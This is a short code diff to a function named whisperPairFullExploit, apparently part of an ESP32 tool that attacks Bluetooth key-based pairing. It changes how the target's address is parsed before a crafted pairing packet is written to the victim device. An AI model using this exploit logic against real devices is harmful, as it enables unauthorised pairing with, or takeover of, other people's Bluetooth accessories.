@@ -29,10 +29,10 @@ bool whisperPairFullExploit(NimBLEAddress target) {
     if(kbp_char) {
         uint8_t packet[16] = {0x00, 0x11};
         uint8_t target_bytes[6];
-        uint64_t addr = target.getNative();
-        for(int i = 0; i < 6; i++) {
-            target_bytes[5-i] = (addr >> (8*i)) & 0xFF;
-        }
+        String macStr = target.toString();
+        sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &target_bytes[5], &target_bytes[4], &target_bytes[3],
+               &target_bytes[2], &target_bytes[1], &target_bytes[0]);
         memcpy(&packet[2], target_bytes, 6);
         esp_fill_random(&packet[8], 8);
         kbp_char->writeValue(packet, 16, false);
